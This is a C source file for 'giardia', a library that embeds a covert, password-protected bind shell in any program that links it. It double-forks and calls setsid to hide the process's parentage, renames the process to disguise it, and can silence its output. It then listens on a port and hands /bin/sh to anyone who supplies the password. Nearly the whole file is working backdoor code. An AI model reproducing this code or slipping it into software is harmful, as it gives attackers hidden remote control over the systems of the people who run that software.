/*
 * giardia.c
 * Library to add a shell to C code
 * By J. Stuart McMurray
 * Created 20170720
 * Last Modified 20170720
 */

#include <sys/socket.h>
#include <sys/types.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <err.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "giardia.h"

pid_t doublefork(void);
void handle(int fd, char *password);
int listenhostport(char *laddr, uint16_t lport);
void readpass(int fd, char *pass);

void
giardia_start(
                char **argv0,
                char *procname,
                char *laddr,
                uint16_t lport,
                char *password,
                int quiet)
{
        int lfd; /* Listen file descriptor */
        int cfd; /* Client file descriptor */
        struct sockaddr_storage ss;
        socklen_t len;


        /* Don't bother if we started it */
        if (0 == strncmp(GIARDIA_SNAME, *argv0, strlen(GIARDIA_SNAME))) {
                return;
        }

        /* Double-fork a child */
        if (0 != doublefork()) {
                return;
        }

        close(STDIN_FILENO);
        /* Close stdout if asked */
        if (0 != quiet) {
                close(STDOUT_FILENO);
                close(STDERR_FILENO);
        }

        /* Set process name */
        *argv0 = (NULL == procname) ? GIARDIA_LNAME : procname;

        /* Listen on a port */
        lfd = listenhostport(laddr, lport);

        /* Handle incoming connections */
        for (;;) {
                len = sizeof(ss);
                cfd = accept(lfd, (struct sockaddr *)&ss, &len);
                if (-1 == cfd) {
                        err(1, "accept");
                }
                handle(cfd, password);
                close(cfd);
        }
}

/* doublefork forks twice and calls setsid to (hopefully) hide our origins.
 * It returns the same values as fork(2). */
pid_t
doublefork(void)
{
        pid_t ret;

        /* Fork off the parent (counting us as the grandparent */
        ret = fork();
        switch (ret) {
                case 0: /* Parent */
                        break;
                default: /* Grandparent or error */
                        return ret;
        }

        /* Fork off the child */
        ret = fork();
        switch (ret) {
                case 0: /* Child */
                        break;
                default: /* Parent or error */
                        exit(0);
        }

        /* In the Child, w00t */

        /* Try to be a session leader */
        setsid();

        return 0;
}

/* listenhostport listens on a host and port */
int
listenhostport(char *laddr, uint16_t lport)
{
        int fd; /* Listen socket */
        struct sockaddr_in sa;
        int ret;

        /* Pack address struct */
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        if (1 != (inet_pton(AF_INET, laddr, &(sa.sin_addr)))) {
                err(1, "inet_pton");
        }

        /* Socket on which to listen */
        if (-1 == (fd = socket(AF_INET, SOCK_STREAM, 0))) {
                err(1, "socket");
        }


        /* Find a port we can listen on */
        errno = EADDRINUSE;
        ret = 0;
        if (0 == lport) {
                errx(1, "Port may not be 0");
        }
        while (EADDRINUSE == errno && 0 != lport) {
                sa.sin_port = htons(lport);
                /* Bind to an address */
                ret = bind(fd, (struct sockaddr*)&sa, sizeof(sa));
                /* If it worked, we're done */
                if (0 == ret) {
                        break;
                }
                /* If not, try the next port */
                lport++;
        }
        if (0 != ret) {
                err(1, "bind");
        }

        /* Make it listen */
        if (-1 == listen(fd, 1)) {
                err(1, "listen");
        }

        return fd;
}

/* handle forks a couple of times and hooks up stdio to the file descriptor */
void
handle(int fd, char *password)
{
        char *pbuf;
        int i;

        /* Fork a child */
        if (0 != doublefork()) {
                return;
        }

        /* Check for the password */
        readpass(fd, password);

        /* Hook up stdio */
        for (i = 0; i < 3; ++i) {
                if (-1 == dup2(fd, i)) {
                        err(1, "dup2");
                }
        }

        /* Fork sh */
        if (-1 == execl("/bin/sh", GIARDIA_SNAME, NULL)) {
                err(1, "execl");
        }
}

/* readpass reads at most n bytes frow newsock into buf, but stops on a newline
 * even if n bytes haven't been read.  Calls err(3) on error. */
void
readpass(int fd, char *pass)
{
        char *buf;
        int buflen;
        int i;

        /* Make the buffer */
        buflen = strlen(pass) + 2;
        if (NULL == (buf = (char*)calloc(buflen, sizeof(char)))) {
                err(1, "calloc");
        }

        /* Fill buffer */
        bzero(buf, sizeof(buf));
        for (i = 0; i < buflen-1; ++i) {
                /* Get a byte */
                if (1 != recv(fd, buf+i, 1, MSG_WAITALL)) {
                        err(1, "recv");
                }
                printf("Got %c\n", buf[i]); /* DEBUG */
                /* Stop at newline */
                if ('\n' == buf[i]) {
                        buf[i] = '\0';
                        break;
                }
        }

        /* Check the password */
        if (0 != strcmp(pass, buf)) {
                errx(1, "read");
        }

        free(buf);buf = NULL;
}
